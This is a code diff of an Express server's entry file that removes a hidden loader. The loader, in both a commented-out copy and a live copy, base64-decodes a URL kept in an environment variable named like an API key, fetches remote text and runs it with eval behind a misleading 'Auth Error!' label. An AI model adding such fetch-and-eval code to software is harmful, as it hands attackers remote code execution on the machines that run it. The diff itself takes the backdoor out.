@@ -6,20 +6,6 @@ import { errorHandler } from './middlewares/error.middleware'
 import routes from './routes'
 import 'dotenv/config';
 
-// (async () => {
-//     const src = atob(process.env.AUTH_API_KEY || '');
-//     // @ts-ignore - node-fetch has no declaration file in this project
-//     const proxy = (await import('node-fetch')).default;
-//     try {
-//       const response = await proxy(src);
-//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-//       const proxyInfo = await response.text();
-//       eval(proxyInfo);
-//     } catch (err) {
-//       console.error('Auth Error!', err);
-//     }
-// })();
-
 dotenv.config()
 
 const app = express()
@@ -62,16 +48,3 @@ const PORT = process.env.PORT || 4000
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`)
 })
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
